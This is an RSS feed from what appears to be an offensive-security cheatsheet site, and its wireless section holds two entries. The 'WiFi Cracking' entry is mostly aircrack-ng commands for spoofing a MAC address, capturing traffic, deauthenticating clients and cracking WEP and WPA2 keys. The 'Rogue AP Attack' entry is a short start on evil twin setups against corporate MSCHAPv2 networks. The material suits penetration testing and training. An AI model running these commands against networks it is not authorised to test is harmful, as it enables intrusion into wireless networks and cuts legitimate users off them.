<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Wireless on Offensive Security Cheatsheet</title>
    <link>/wireless/</link>
    <description>Recent content in Wireless on Offensive Security Cheatsheet</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language><atom:link href="/wireless/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>WiFi Cracking</title>
      <link>/wireless/wifi_cracking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/wireless/wifi_cracking/</guid>
      <description>General Informations # Bypass MAC filter macchanger –m B0:D0:9C:5C:EF:86 wlan0 Monitoring, Recon and Dumping # Using the aircrack-ng suite # Turning on the monitor mode sudo airmon-ng start wlan0mon # Simple passive listening and capture # Used to discover AP in the environment sudo airodump-ng wlan0mon # Targetted listening and capture # Focus on one AP and one channel sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile Attacking WEP # WEP is an old encryption protocol but still used in some places # It is vulnerable to direct cracking attacks # The only requirement is to get enough IV # The process can be enhanced by sending deauth packets # -0 == detauth attack, sending 3 packets (can be increased) aireplay-ng -0 3 -a &amp;lt;TARGET_AP_MAC&amp;gt; wlan0mon -w # Another possibility is to use fake authentication to generate IV # -1 = fake authentication # 0 = delay between association demands # -e = AP ESSID (name) # -a = AP MAC # -h = attacker MAC aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon # ARP Sniffing and injection is another method aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon # Using aircrack-ng it is possible to directly crack the WEP Key aircrack-ng outfile -w wordlist Attacking WPA2 PSK (The old way) # Using the aircrack-ng suite # You can first focus one AP using airodump-ng (see monitoring section) # Here, you want to get the 4-way WPA Handshake # It requires network traffic between the AP and one device # Dumping sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile # Deauth connected devices to initiate authentication process and try to get the handshake aireplay-ng --deauth 15 -a &amp;lt;TARGET_AP_MAC&amp;gt; wlan0mon aireplay-ng -0 15 -a &amp;lt;TARGET_AP_MAC&amp;gt; wlan0mon # In the airodump-ng console, the WPA handshake will appear once captured # Cracking can be done using aircrack-ng aircrack-ng outfile -w wordlist # But also using other tools like hashcat # The outfile needs to be an HCCAPX file # Hashcat utils provide a binary to convert .</description>
    </item>
    
    <item>
      <title>Rogue AP Attack</title>
      <link>/wireless/rogue_ap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/wireless/rogue_ap/</guid>
      <description>General Informations # If you need several external eth interfaces, connect then at the beginning # To ensure having wlan0 and wlan1 # And avoid having wlan0mon and then wlan0 when you connect the second one # It could result in conflicts # Evil Twin / Hostapd-wpe is used against MSCHAPv2 access points, usually used by companies # Manually creating a rogue AP for classical WPA/WPA2 requires more configuration # You might need to patch your hostapd version https://github.</description>
    </item>
    
  </channel>
</rss>
